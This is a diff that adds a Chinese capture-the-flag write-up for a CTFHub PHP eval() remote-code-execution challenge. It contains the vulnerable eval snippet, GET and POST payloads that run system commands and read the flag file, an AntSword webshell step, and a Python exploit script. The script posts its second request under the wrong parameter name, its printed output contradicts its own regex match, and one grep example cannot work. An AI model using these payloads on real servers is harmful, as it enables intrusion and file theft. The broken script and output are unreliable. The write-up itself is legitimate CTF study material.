@@ -2103,3 +2103,146 @@ string(42) "<?php // ctfhub{8e74299472595775b12434ed}
 提交`ctfhub{8e74299472595775b12434ed}`即可。
 
 ------
+
+## RCE
+
+### eval执行
+
+进入靶机后，直接就是`PHP`代码审计。
+
+```php
+<?php
+if (isset($_REQUEST['cmd'])) {
+    eval($_REQUEST["cmd"]);
+} else {
+    highlight_file(__FILE__);
+}
+?>
+```
+
+当用户提供`cmd`参数时，它无条件地执行传递参数中的`PHP`代码。当用户没有提供`cmd`参数时，它将自己的源代码显示出来，即我们看到的上述代码。攻击者可以通过访问这个脚本的URL，并附加 `cmd` 参数来控制靶机服务器，其风险点具体如下所示。
+
+- **任意代码执行 (RCE)：** `eval($_REQUEST["cmd"])` 是高危风险点，它允许攻击者执行任何`PHP`代码，而`PHP`几乎可以调用所有系统命令和操作所有文件。
+
+- **多种传参方式：** 使用 `$_REQUEST` 使得攻击者可以通过 **GET**（URL）、**POST**（表单）或 **COOKIE** 来传递恶意命令，更加隐蔽。
+- **白给自身源码**：当用户不传递参数时，它显示自己的代码，就像展示攻击点说明书一样。
+
+#### 解法一：`GET`传参
+
+我们可以直接`GET`传参`?cmd=system(%27ls%20/%27);`，靶机显示内容如下：
+
+> bin boot dev etc flag_17723 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+
+由此可知，靶机的`flag`文件为`flag_17723`。正好借此机会复习一下`Linux`常用的读取文件命令行。
+
+用`cat`读取文件，即执行`cat /flag`，具体传参为`/?cmd=system(%27cat%20/flag_17723%27);`。
+
+用`tail`读取文件，`tail`用于显示文件末尾内容，可以通过`-n`指定显示行数，默认输出末尾10行。即执行`tail /flag`，具体传参为`/?cmd=system(%27tail%20/flag_17723%27);`。
+
+用`head`读取文件，`head`用于查看文件开头内容，可以通过`-n`指定显示行数，默认显示10行内容。即执行`head /flag`，具体传参为`/?cmd=system(%27head%20/flag_17723%27);`。
+
+用`grep`读取文件，`grep`主要用于搜索文件里符合条件的字符串或正则表达式。`grep`指令也可用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设`grep`指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，则`grep`指令会从标准输入设备读取数据。即执行`grep /flag`，具体传参为`/?cmd=system(%27grep%20/flag_17723%27);`。
+
+用`strings`读取文件，`strings`能显示文件中可打印字符串，一般用于从二进制文件提取可打印字符。即执行`strings /flag`，具体传参为`/?cmd=system(%27strings%20/flag_17723%27);`。
+
+用`awk`读取文件，`awk`是一个文本处理工具，能够逐行读取文本文件，也可用于选择性查看。比如查看前三行内容`awk 'NR<=3' /flag`，具体传参为`/?cmd=system("awk 'NR<=3' /flag_17723");`。
+
+用`sed`读取文件，`sed`是流编辑器，也可以查看特定行。比如查看前三行内容`sed -n '1,3p' /flag`，具体传参为`/?cmd=system("sed -n '1,3p' /flag_17723");`。
+
+以上所有命令执行后，靶机的显示信息如下：
+
+> ctfhub{d0fcbbf8ba8db617979a634d}
+
+用`more`读取文件，`more`类似于`cat`，但是会分页显示内容，便于逐页阅读文件。即执行`more /flag`，具体传参为`/?cmd=system(%27more%20/flag_17723%27);`。执行后靶机显示的信息如下：
+
+> :::::::::::::: /flag_17723 :::::::::::::: ctfhub{d0fcbbf8ba8db617979a634d}
+
+用`nl`读取文件，`nl`的主要功能是读取文件内容并为每一行添加行号，再将结果输出到标准输出。即执行`nl /flag`，具体传参为`/?cmd=system(%27nl%20/flag_17723%27);`。执行后靶机显示的信息如下：
+
+> 1 ctfhub{d0fcbbf8ba8db617979a634d}
+
+------
+
+#### 解法二：`HackBar`构造`POST`请求
+
+我们用`HackBar`构造`POST`请求。在`flag`的常见位置查找`flag`文件。
+
+```php
+cmd=var_dump(array_merge(
+    glob('/*flag*'),
+    glob('/home/*/*flag*'),
+    glob('/var/www/*/*flag*'),
+    glob('/tmp/*flag*')
+));
+```
+
+接着用`print`配合`file_get_contents`将`flag`文件中的内容读取出来。
+
+```php
+cmd=print(file_get_contents('/flag_17723'));
+```
+
+执行后靶机显示的信息如下：
+
+> ctfhub{d0fcbbf8ba8db617979a634d}
+
+或者用`var_dump`配合`file_get_contents`将`flag`文件中的内容显示出来。
+
+```php
+cmd=var_dump(file_get_contents('/flag_17723'));
+```
+
+执行后靶机显示的信息如下：
+
+> string(33) "ctfhub{d0fcbbf8ba8db617979a634d} "
+
+------
+
+#### 解法三：`AntSword`连接靶机
+
+打开`AntSword`连接靶机，直接可以在`/flag_17723`中看到`flag`内容。
+
+------
+
+#### 解法四：编写`python`代码
+
+这道题跟`HackBar`构造`POST`请求和`AntSword`连接靶机类似，如果能用自己的笔记本打CTF比赛时用起来最快最方便；如果是用机房中的公用电脑打CTF还是用`AntSword`最合适最省时间。
+
+```python
+import requests
+import re
+
+url = 'http://challenge-14d17025269b6105.sandbox.ctfhub.com:10800/'
+payload_find = "var_dump(array_merge(glob('*/flag*'), glob('/home/*/*flag*'), glob('/var/www/*/*flag*'), glob('/tmp/*flag*')));"
+response1 = requests.post(url, data={"cmd": payload_find})
+print("=== Find flag files ===")
+print(response1.text)
+
+match = re.search(r'string\(\d+\)\s+"([^"]+)"', response1.text)
+if match:
+    flag_path = match.group(1)
+    print("Found flag file:", flag_path)
+    payload_read = f"var_dump(file_get_contents('{flag_path}'));"
+    response2 = requests.post(url, data={"t0ur1st": payload_read})
+    print("\n=== Read flag content ===")
+    print(response2.text)
+else:
+    print("No flag path found.")
+```
+
+代码执行结果如下：
+
+```
+=== Find flag files ===
+array(1) {
+  [0]=>
+  string(11) "/flag_17723"
+}
+
+Found flag file: /var/www/html/flag_2202129874.php
+
+=== Read flag content ===
+string(33) "ctfhub{d0fcbbf8ba8db617979a634d} "
+```
+
+------
